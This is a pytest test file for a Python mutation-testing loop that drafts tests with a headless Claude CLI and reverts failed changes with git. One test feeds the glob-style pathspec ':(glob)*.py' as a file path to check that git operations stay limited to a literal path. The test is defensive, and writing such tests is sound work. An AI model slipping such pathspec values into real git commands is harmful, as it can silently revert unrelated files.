    monkeypatch.setattr(loop, "run_scoped_pytest", lambda *a, **k: False)
    monkeypatch.setattr(loop, "git_revert", lambda tf, **k: False)

    test_file = tmp_path / "test_a.py"
    test_file.write_text("def test_existing():\n    assert True\n", encoding="utf-8")
    source_file = tmp_path / "a.py"
    source_file.write_text("x = 1\n", encoding="utf-8")

    with pytest.raises(RuntimeError, match="revert failed"):
        loop.run_for_file(
            "src/a.py",
            test_file=test_file,
            source_path=source_file,
            test_command="pytest",
            generate=lambda *_a: "def test_new():\n    assert True\n",
        )


# =============================================================================
# Scenario (real git, no mocks): git_reset_and_revert leaves both the index
# AND the working tree matching HEAD after a commit-failure-style staged
# mutation — mirrors mutation_kill_loop.py's real-git regression test for
# the same #1598 bug class.
# =============================================================================
def test_git_reset_and_revert_restores_index_and_worktree_after_a_staged_mutation(
    tmp_path: Path,
):
    git_hermetic(tmp_path, "init", "-q")
    git_hermetic(tmp_path, "config", "user.email", "test@example.com")
    git_hermetic(tmp_path, "config", "user.name", "Test")
    git_hermetic(tmp_path, "config", "commit.gpgsign", "false")

    test_file = tmp_path / "test_a.py"
    original = "def test_existing():\n    assert True\n"
    test_file.write_text(original, encoding="utf-8")
    git_hermetic(tmp_path, "add", "-A")
    git_hermetic(tmp_path, "commit", "-q", "-m", "initial")

    mutated = original + "\ndef test_mutated_never_committed():\n    assert False\n"
    test_file.write_text(mutated, encoding="utf-8")
    git_hermetic(tmp_path, "add", "--", str(test_file))

    staged = git_hermetic(tmp_path, "diff", "--cached", "--name-only")
    assert "test_a.py" in staged.stdout

    # env= is the point of this test: the SUT's own git subprocess must run
    # hermetically too, not just this test's setup calls above (#1598/#1584
    # review, round 3 — test-smell-review/ai-provenance-review found the
    # round-2 fix scrubbed only the setup calls).
    assert (
        loop.git_reset_and_revert(
            test_file, cwd=tmp_path, env=hermetic_git_env(home=tmp_path)
        )
        is True
    )

    assert test_file.read_text(encoding="utf-8") == original
    status = git_hermetic(tmp_path, "status", "--porcelain")
    assert status.stdout.strip() == ""


# =============================================================================
# Scenario: --literal-pathspecs neutralizes pathspec magic characters in a
# test_file value — every git call in both loops treats `--` as introducing a
# pathspec, not a literal path, so magic characters (`:/`, `:(glob)`, etc.)
# remain active even after `--` unless --literal-pathspecs is set
# (#1598/#1584 review, item 5). Real git (hermetic), not mocked: a mocked
# argv-shape assertion can't prove the flag actually changes git's matching
# behavior the way this test does.
# =============================================================================
def test_git_revert_with_a_literal_pathspecs_flag_does_not_broaden_scope_to_a_glob_match(
    tmp_path: Path,
):
    git_hermetic(tmp_path, "init", "-q")
    git_hermetic(tmp_path, "config", "user.email", "test@example.com")
    git_hermetic(tmp_path, "config", "user.name", "Test")
    git_hermetic(tmp_path, "config", "commit.gpgsign", "false")

    important = tmp_path / "important.py"
    original = "def test_important():\n    assert True\n"
    important.write_text(original, encoding="utf-8")
    git_hermetic(tmp_path, "add", "-A")
    git_hermetic(tmp_path, "commit", "-q", "-m", "initial")

    # Mutate the file we DON'T want touched.
    mutated = original + "\ndef test_mutated():\n    assert False\n"
    important.write_text(mutated, encoding="utf-8")

    # A test_file value shaped like a pathspec-magic glob — without
    # --literal-pathspecs, `git checkout -- ':(glob)*.py'` would match every
    # .py file in the repo (including important.py) and silently revert it
    # too. With --literal-pathspecs, this string is a literal (nonexistent)
    # filename, so the revert affects nothing else.
    magic_path = Path(":(glob)*.py")

    result = loop.git_revert(magic_path, cwd=tmp_path, env=hermetic_git_env(home=tmp_path))

    # The literal path doesn't exist, so the revert itself fails...
    assert result is False
    # ...and, crucially, important.py's uncommitted mutation survives —
    # proving the operation did NOT broaden to match every .py file via glob.
    assert important.read_text(encoding="utf-8") == mutated


# =============================================================================
# Scenario: _release_mutmut_cache_lock swallows a release-time OSError rather
# than masking whatever exception the run itself was raising (#1584 review).
# =============================================================================
def test_release_mutmut_cache_lock_swallows_a_missing_directory(tmp_path: Path):
    lock_dir = tmp_path / ".mutmut-cache.lock"
    lock_dir.mkdir()
    lock_dir.rmdir()  # already gone — simulates a race/double-release

    loop._release_mutmut_cache_lock(lock_dir)  # must not raise


# =============================================================================
# Scenario: the mutmut-cache lock timeout is overridable via env var, not a
# bare magic number (#1584 review, item 9) — mirrors mutation_kill_loop.py's
# _timeout_from_env pattern.
# =============================================================================
def test_mutmut_cache_lock_timeout_is_overridable_via_env(monkeypatch: pytest.MonkeyPatch):
    monkeypatch.setenv("DEV_TEAM_MUTATION_MUTMUT_LOCK_TIMEOUT_S", "77")
    import importlib

    reloaded = importlib.reload(loop)
    try:
        assert reloaded._MUTMUT_CACHE_LOCK_TIMEOUT_S == 77
    finally:
        monkeypatch.delenv("DEV_TEAM_MUTATION_MUTMUT_LOCK_TIMEOUT_S", raising=False)
        importlib.reload(loop)


# =============================================================================
# No repo-specific literal leaked into the module
# =============================================================================
def test_module_source_carries_no_repo_specific_literal():
    source = (SCRIPTS_DIR / "mutation_kill_loop_python.py").read_text(encoding="utf-8")
    present = [literal for literal in FORBIDDEN_LITERALS if literal in source]
    assert present == [], f"repo-specific literals leaked into module: {present}"


# =============================================================================
# CLI preflight — mirrors mutation_kill_loop.py's fail-fast contract
# =============================================================================
def test_main_without_headless_fails_fast_with_no_generator_message(capsys):
    rc = loop.main([])
    assert rc == 1
    assert loop.NO_GENERATOR_MESSAGE in capsys.readouterr().err


def test_main_headless_without_required_flags_errors(monkeypatch, capsys):
    monkeypatch.setattr(loop, "claude_cli_available", lambda: True)
    rc = loop.main(["--headless"])
    assert rc == 2
    assert "requires --file" in capsys.readouterr().err


def test_main_headless_missing_claude_cli_fails_before_touching_files(monkeypatch, capsys):
    monkeypatch.setattr(loop, "claude_cli_available", lambda: False)
    rc = loop.main(["--headless", "--file", "a.py"])
    assert rc == 3
    assert "Claude CLI" in capsys.readouterr().err


# =============================================================================
# Scenario: A round-abandoning RuntimeError (failed revert, failed commit —
# #1598) propagates to a non-zero exit code instead of a silent 0 return or
# a raw traceback (#1598/#1584 review, item 6).
# =============================================================================
def test_main_exits_non_zero_when_run_for_file_raises(monkeypatch, capsys, tmp_path: Path):
    monkeypatch.setattr(loop, "claude_cli_available", lambda: True)

    def boom(*a, **k):
        raise RuntimeError("revert failed for test_a.py after a failed commit")

    monkeypatch.setattr(loop, "run_for_file", boom)

    rc = loop.main(
        [
            "--headless",
            "--file", "a.py",
            "--test-file", str(tmp_path / "test_a.py"),
            "--source-path", str(tmp_path / "a.py"),
            "--test-command", "pytest",
        ]
    )

    assert rc != 0
    assert rc not in (1, 2, 3)
    assert "revert failed" in capsys.readouterr().err
